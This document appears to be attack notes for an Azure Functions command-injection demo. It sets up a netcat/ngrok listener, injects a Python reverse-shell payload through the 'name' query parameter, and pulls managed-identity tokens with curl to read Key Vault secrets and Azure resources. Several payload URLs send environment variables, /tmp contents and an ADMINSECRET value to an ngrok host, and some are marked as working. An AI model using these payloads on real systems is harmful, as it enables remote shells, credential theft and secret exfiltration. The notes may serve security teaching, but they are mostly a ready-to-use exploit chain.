Getting a reverse shell to our function

### Set up ncat listener  

`nc -l 3006`

### Set up ngrok forwarder  

`ngrok tcp 3006`

### Send a request with exploit in username
You will need to edit the:  
1. Functions App Name
2. Function Name
3. Ngrok port


``` bash
https://<functionAppName>.azurewebsites.net/api/<functionName>?name=dean;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ngrok.io\",<NGROK_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
```

### Explore the file system  
```bash
#We're not in a TTY shell, so let's spawn one, this will help with enumeration
python -c 'import pty; pty.spawn("/bin/sh")'

#List the files in the filesystem
ls

# See what's in the /tmp/ directory, this is the only place we can write
ls /tmp/

# See what environment variables we have
env

# Look for MSI details
env | grep MSI 

# get JWT token for storage service from MSI
# further reading: https://techcommunity.microsoft.com/t5/Azure-Developer-Community-Blog/Understanding-Azure-MSI-Managed-Service-Identity-tokens-caching/ba-p/337406
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
```

You can decode the JWT using a tool such as   
The decoded token looks something like this:  

```json
{
  "aud" : "https://storage.azure.com/",
  "iss" : "https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/",
  "iat" : 1581421569,
  "nbf" : 1581421569,
  "exp" : 1581450669,
  "aio" : "42NgYMhza09atd3m+W4GlsojspLzAQ==",
  "appid" : "c7ad206c-1584-4e6d-b0e2-ba999d312046",
  "appidacr" : "2",
  "idp" : "https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/",
  "oid" : "893645c7-e7fa-495f-8ade-d7bdd05efa25",
  "sub" : "893645c7-e7fa-495f-8ade-d7bdd05efa25",
  "tid" : "72f988bf-86f1-41af-91ab-2d7cd011db47",
  "uti" : "Q5pAPKv7gEO4k2Oh2oD1AA",
  "ver" : "1.0",
  "xms_mirid" : "/subscriptions/11111111-2222-3333-4444-55555555/resourcegroups/slssec/providers/Microsoft.Web/sites/slsSec"
}
```

### Get a Bearer token for the vault service (functions host)
```
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net" 
```

### Use the bearer token to list Vaults (attack machine)
```bash
export BEARER_TOKEN=<SET TOKEN VALUE>
export VAULT_NAME=<ENTER_KEY_VAULT_NAME>
curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
```

### store the secretID as an environment variable  
```bash
export secretId=https://slsvault.vault.azure.net/secrets/ADMINSECRET/8df8b605444c44c69bf07cfb76e70f6e
```
### Store the key as an app setting, functions will use MSI to get this
```bash

```

curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://management.azure.com/subscriptions/8d3519e1-8089-4300-ab0b-bfeda0f9844c/resources?api-version=2018-02-14"


## Get reverse shell from name field.
```bash
http://localhost:4445/api/slsSec?name="dean;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\%220.tcp.ngrok.io\%22,16571));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\%22/bin/sh\%22,\%22-i\%22]);%27"
```

http://localhost:4445/api/slsSec?name=%22tele%20&&python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\%220.tcp.ngrok.io\%22,11315));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\%22/bin/sh\%22,\%22-i\%22]);%27%22

http://localhost:4445/api/slsSec?name=%22sarah%20;echo%20\%22$(uname)\%22;%20curl%209b620615.ngrok.io?data=$(ls%20/tmp%20|%20base64)%22

python -c 'import os; os.environ.get('HOME')'

http://localhost:4445/api/slsSec?name=Sarah ; curl 209b620615.ngrok.io?data=$(python -c 'import os; os.environ.get('HOME')' | base64)


# This one works
### Lists out the files in /tmp
```bash
https://slssec.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%209b620615.ngrok.io?data=$(ls%20/tmp%20|%20base64%20--wrap=0)
```

### cat one of the files in /tmp
```bash
https://slssec.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%209b620615.ngrok.io?data=$(tail%20/tmp/Sarah%20|%20base64%20--wrap=0)
```

# This one works
### Lists out the environment variables
```bash
https://slssec.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%209b620615.ngrok.io?data=$(env%20|%20base64%20--wrap=0)
```

# This one works
### Gets value of ADMINSECRET
```bash
https://slssec.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%209b620615.ngrok.io?data=$(echo%20$ADMINSECRET%20|%20base64%20--wrap=0)
```

https://slssec.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%209b620615.ngrok.io?data=$(python%20-c%20'import%20os%20;%20os.environ'%20|%20base64%20--wrap=0)

